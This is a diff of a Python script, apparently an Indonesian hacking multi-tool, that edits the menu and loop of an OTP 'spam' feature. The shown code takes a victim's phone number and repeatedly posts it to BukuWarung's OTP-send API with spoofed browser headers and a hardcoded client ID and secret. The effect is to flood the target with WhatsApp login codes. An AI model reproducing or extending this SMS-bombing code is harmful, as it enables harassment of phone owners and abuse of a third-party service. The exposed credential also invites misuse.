@@ -2216,8 +2216,6 @@ def akhir():
 
 def spam():
 	try:
-		clear()
-		banner()
 		prints(Panel(f"""{H2}Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx""",width=80,padding=(0,6),style=f"{color_panel}"))
 		nomor = console.input(f" {H2}• {P2}Masukan No +62 : ").replace("+62","")
 		tokoko=requests.post("https://api-v2.bukuwarung.com/api/v2/auth/otp/send",headers={'Host':'api-v2.bukuwarung.com','content-length':'198','sec-ch-ua':'"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile':'?0','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36','content-type':'application/json','accept':'application/json, text/plain, */*','x-app-version-code':'5050','x-app-version-name':'android','buku-origin':'tokoko','sec-ch-ua-platform':'"Linux"','origin':'https://web.tokoko.id','sec-fetch-site':'cross-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://web.tokoko.id/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',},data=json.dumps({"action":"LOGIN_OTP","countryCode":"+62","deviceId":"test-1","method":"WA","phone":nomor,"clientId":"2e3570c6-317e-4524-b284-980e5a4335b6","clientSecret":"S81VsdrwNUN23YARAL54MFjB2JSV2TLn"})).text
@@ -2252,7 +2250,7 @@ class botdata:
         if menu in["01","1"]:
             get_data_web().__init__()
         elif menu in["02","2"]:
-            spam()
+            spam_sms()
         elif menu in["03","3"]:
             back()
         else:
@@ -2402,7 +2400,7 @@ def spam_sms():
 	else:
 		while True:
 			for _ in track(range(100), description=f' {H2}• {P2} Sedang Spam...'):process_data1()
-			sxp_sms()
+			spam()
 
 class sxp_sms:
 
